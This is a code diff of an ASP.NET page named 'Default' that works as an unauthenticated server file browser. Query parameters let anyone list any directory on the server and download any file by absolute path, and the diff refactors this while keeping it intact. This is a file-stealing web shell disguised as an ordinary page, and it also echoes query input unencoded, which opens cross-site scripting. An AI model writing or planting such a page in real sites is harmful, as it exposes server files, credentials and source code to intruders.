@@ -1,74 +1,84 @@
-<%@ Page Language="C#" Debug="true" %>
+<%@ Page Language="C#" %>
 <%@ Import Namespace="System.IO" %>
 <%@ Import Namespace="System.Web" %>
-<%@ Import Namespace="System.Linq" %>
+
+<script runat="server">
+    protected string RootPath = HttpRuntime.AppDomainAppPath;
+
+    protected string CurrentPath => string.IsNullOrEmpty(Request.QueryString["path"])
+        ? RootPath
+        : Request.QueryString["path"];
+
+    protected string Keyword => Request.QueryString["keyword"] ?? "";
+
+    protected string GenerateDirectoryListing()
+    {
+        try
+        {
+            if (!Directory.Exists(CurrentPath))
+                return "<p style='color:red;'>Invalid path</p>";
+
+            var html = "<ul>";
+
+            foreach (var dir in Directory.GetDirectories(CurrentPath))
+            {
+                var folderName = Path.GetFileName(dir);
+                if (!string.IsNullOrEmpty(Keyword) &&
+                    !folderName.Contains(Keyword, StringComparison.OrdinalIgnoreCase))
+                    continue;
+
+                var link = "?path=" + HttpUtility.UrlEncode(dir);
+                html += $"<li>[D] <a href='{link}'>{folderName}</a></li>";
+            }
+
+            foreach (var file in Directory.GetFiles(CurrentPath))
+            {
+                var fileName = Path.GetFileName(file);
+                if (!string.IsNullOrEmpty(Keyword) &&
+                    !fileName.Contains(Keyword, StringComparison.OrdinalIgnoreCase))
+                    continue;
+
+                var downloadLink = "?download=" + HttpUtility.UrlEncode(file);
+                html += $"<li>[F] <a href='{downloadLink}'>{fileName}</a></li>";
+            }
+
+            html += "</ul>";
+            return html;
+        }
+        catch (Exception ex)
+        {
+            return $"<p style='color:red;'>error: {HttpUtility.HtmlEncode(ex.Message)}</p>";
+        }
+    }
+
+    protected void Page_Load(object sender, EventArgs e)
+    {
+        if (!string.IsNullOrEmpty(Request.QueryString["download"]))
+        {
+            string filePath = Request.QueryString["download"];
+            if (File.Exists(filePath))
+            {
+                Response.Clear();
+                Response.ContentType = "application/octet-stream";
+                Response.AddHeader("Content-Disposition", $"attachment; filename={Path.GetFileName(filePath)}");
+                Response.WriteFile(filePath);
+                Response.End();
+            }
+        }
+    }
+</script>
+
 <html>
 <head>
     <title>Default</title>
 </head>
 <body>
-    <%
-        string inputPath = Request.QueryString["path"];
-        string keyword = Request.QueryString["search"];
-        string dirPath = string.IsNullOrEmpty(inputPath) ? Directory.GetCurrentDirectory() : inputPath;
-
-        string downloadPath = Request.QueryString["download"];
-        if (!string.IsNullOrEmpty(downloadPath) && File.Exists(downloadPath))
-        {
-            Response.Clear();
-            Response.ContentType = "application/octet-stream";
-            Response.AddHeader("Content-Disposition", "attachment; filename=" + Path.GetFileName(downloadPath));
-            Response.WriteFile(downloadPath);
-            Response.End();
-        }
-    %>
-
-    <h2>📂 current: <%= dirPath %></h2>
-
     <form method="get">
-        <input type="text" name="path" value="<%= dirPath %>" style="width:50%;" placeholder="input path" />
-        <input type="text" name="search" value="<%= keyword %>" placeholder="search" />
+        <input type="text" name="path" value="<%= CurrentPath %>" style="width:400px;" />
+        <input type="text" name="keyword" value="<%= Keyword %>" placeholder="input" />
         <input type="submit" value="go" />
     </form>
 
-    <p>
-        <% if (Directory.GetParent(dirPath) != null) { %>
-            <a href="?path=<%= HttpUtility.UrlEncode(Directory.GetParent(dirPath).FullName) %>">⬆ up</a>
-        <% } %>
-    </p>
-
-    <ul>
-        <%
-            try
-            {
-                foreach (string dir in Directory.GetDirectories(dirPath))
-                {
-                    string folderName = Path.GetFileName(dir);
-                    if (!string.IsNullOrEmpty(keyword) && !folderName.Contains(keyword, StringComparison.OrdinalIgnoreCase))
-                        continue;
-
-                    string link = "?path=" + HttpUtility.UrlEncode(dir);
-        %>
-                    <li>[📁] <a href="<%= link %>"><%= folderName %></a></li>
-        <%
-                }
-                foreach (string file in Directory.GetFiles(dirPath))
-                {
-                    string fileName = Path.GetFileName(file);
-                    if (!string.IsNullOrEmpty(keyword) && !fileName.Contains(keyword, StringComparison.OrdinalIgnoreCase))
-                        continue;
-
-                    string downloadLink = "?download=" + HttpUtility.UrlEncode(file);
-        %>
-                    <li>[📄] <a href="<%= downloadLink %>"><%= fileName %></a></li>
-        <%
-                }
-            }
-            catch (Exception ex)
-            {
-                Response.Write("<p style='color:red;'>error: " + ex.Message + "</p>");
-            }
-        %>
-    </ul>
+    <%= GenerateDirectoryListing() %>
 </body>
 </html>
